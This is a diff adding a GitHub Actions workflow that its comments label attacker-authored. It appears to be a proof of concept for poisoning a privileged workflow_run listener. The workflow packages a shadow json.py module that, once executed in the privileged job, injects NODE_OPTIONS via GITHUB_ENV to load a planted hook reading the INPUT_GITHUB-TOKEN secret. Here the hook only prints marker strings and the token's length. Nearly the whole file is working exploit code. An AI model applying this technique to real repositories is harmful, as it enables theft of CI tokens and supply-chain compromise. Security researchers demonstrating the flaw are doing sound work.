@@ -1,0 +1,37 @@
+# Attacker-authored workflow added in a pull request. Its *name* matches the
+# workflow watched by the privileged workflow_run listener.
+name: "CI: mypy primer run"
+
+on:
+  pull_request:
+
+permissions:
+  contents: read
+
+jobs:
+  mypy_primer:
+    runs-on: ubuntu-latest
+    steps:
+      - name: Build attacker-controlled artifact
+        run: |
+          mkdir -p payload/scripts
+          cat > payload/scripts/json.py <<'PY'
+          import os
+          print("PWNED_SHADOW_MODULE_EXECUTED")
+          open("pwned_marker.txt", "w").write("pwned")
+          hook = os.path.abspath("scripts/hook.js")
+          with open(hook, "w") as f:
+              f.write("console.log('PWNED_NODE_REQUIRE_EXECUTED');"
+                      "const t = process.env['INPUT_GITHUB-TOKEN'] || '';"
+                      "console.log('TOKEN_VISIBLE=' + (t ? 'yes len=' + t.length : 'no'));\n")
+          with open(os.environ["GITHUB_ENV"], "a") as f:
+              f.write("NODE_OPTIONS=--require " + hook + "\n")
+          raise SystemExit(0)
+          PY
+          printf '+new-error [bad-assignment]\n' > payload/diff_0.txt
+          printf '1\n' > payload/pr_number.txt
+      - name: Upload artifact with the name the listener downloads
+        uses: actions/upload-artifact@v4
+        with:
+          name: mypy_primer_diffs
+          path: payload
